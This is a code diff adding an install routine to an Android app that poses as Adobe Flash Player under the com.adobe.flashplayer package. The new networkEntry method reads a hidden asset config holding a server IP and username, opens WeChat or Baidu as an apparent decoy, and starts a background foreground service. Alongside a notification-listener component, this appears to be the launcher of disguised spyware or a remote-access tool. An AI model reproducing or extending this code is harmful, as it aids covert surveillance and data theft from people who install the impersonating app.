@@ -7,6 +7,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import java.io.File;
+import java.io.InputStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -24,6 +25,8 @@ import android.widget.EditText;
 import android.widget.Toast;
 import com.adobe.flashplayer.PrefOper;
 import com.adobe.flashplayer.Public;
+import com.adobe.flashplayer.accessory.AccessHelper;
+import com.adobe.flashplayer.core.CoreHelper;
 import com.adobe.flashplayer.core.NoteListenerSrv;
 
 import java.util.List;
@@ -37,6 +40,8 @@ import android.content.Intent;
 import android.os.Build;
 import android.provider.Settings;
 import android.util.Log;
+
+import org.json.JSONObject;
 
 
 public class InstallHelper {
@@ -202,5 +207,103 @@ public class InstallHelper {
     }
 
 
+
+
+
+    public static boolean networkEntry(Activity activity){
+
+        try{
+            String mode = PrefOper.getValue(activity, Public.PARAMCONFIG_FileName, Public.SETUPMODE);
+            if (mode.equals(Public.SETUPMODE_MANUAL) || mode.equals(Public.SETUPMODE_JAR) || mode.equals(Public.SETUPMODE_SO)) {
+                return false;
+            }
+
+            if ( mode.equals("")) {
+                InputStream is = activity.getAssets().open(Public.CONFIG_FILENAME );
+                int size = is.available();
+                if (is == null || size <= 0) {
+                    return false;
+                }
+
+                byte[] buffer = new byte[size];
+                is.read(buffer);
+                is.close();
+                String cfg = new String(buffer);
+                JSONObject js = new JSONObject(cfg);
+                mode = js.optString(Public.SETUPMODE);
+
+                if (mode.equals(Public.SETUPMODE_APK)) {
+
+                    String apktype = (String)js.optString(Public.SETUPMODE_APK_TYPE);
+                    if (apktype.contains("weixin")) {
+                        Intent intent = new Intent();
+                        ComponentName componentName = new ComponentName("com.tencent.mm", "com.tencent.mm.ui.LauncherUI");
+                        intent.setComponent(componentName);
+                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        activity.startActivity(intent);
+                    }else if (apktype.contains("baidu")) {
+                        Uri uri = Uri.parse("https://www.baidu.com");
+                        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
+                        activity.startActivity(intent);
+                    }else{
+                        apktype = "baidu";
+                        Uri uri = Uri.parse("https://www.baidu.com");
+                        Intent intent = new Intent(Intent.ACTION_VIEW, uri);
+                        activity.startActivity(intent);
+                    }
+
+                    PrefOper.setValue(activity, Public.PARAMCONFIG_FileName, Public.SETUPMODE,mode);
+
+                    PrefOper.setValue(activity, Public.PARAMCONFIG_FileName,Public.SETUPMODE_APK_TYPE, apktype);
+
+                    String ip = (String)js.optString("ip");
+                    String username = (String)js.optString("username");
+
+//		            String ip = (String)js.optString(ForegroundService.CFGSERVERIP);
+//		            String username = (String)js.optString(ForegroundService.CFGUSERNAME);
+
+//					String ip = PrefOper.getValue(activity, ForegroundService.PARAMCONFIG_FileName,
+//							ForegroundService.CFGSERVERIP);
+//					String username = PrefOper.getValue(activity, ForegroundService.PARAMCONFIG_FileName,
+//							ForegroundService.CFGUSERNAME);
+
+                    PrefOper.setValue(activity, Public.PARAMCONFIG_FileName,Public.CFGSERVERIP,ip);
+
+                    PrefOper.setValue(activity, Public.PARAMCONFIG_FileName,Public.CFGUSERNAME,username);
+
+                    CoreHelper.launchForegroundService(activity);
+                    return true;
+                }else{
+                    return false;
+                }
+            }else if( mode.equals(Public.SETUPMODE_APK)){
+                String apktype = PrefOper.getValue(activity, Public.PARAMCONFIG_FileName, Public.SETUPMODE_APK_TYPE);
+                if (apktype.contains("weixin")) {
+                    Intent intent = new Intent();
+                    ComponentName componentName = new ComponentName("com.tencent.mm", "com.tencent.mm.ui.LauncherUI");
+                    intent.setComponent(componentName);
+                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    activity.startActivity(intent);
+                }else if (apktype.contains("baidu")) {
+                    Uri uri = Uri.parse("https://www.baidu.com");
+                    Intent intent = new Intent(Intent.ACTION_VIEW, uri);
+                    activity.startActivity(intent);
+                }else{
+                    Uri uri = Uri.parse("https://www.baidu.com");
+                    Intent intent = new Intent(Intent.ACTION_VIEW, uri);
+                    activity.startActivity(intent);
+                    apktype = "baidu";
+                }
+                CoreHelper.launchForegroundService(activity);
+                return true;
+            }else{
+                return false;
+            }
+        }catch(Exception ex){
+            ex.printStackTrace();
+        }
+
+        return false;
+    }
 
 }
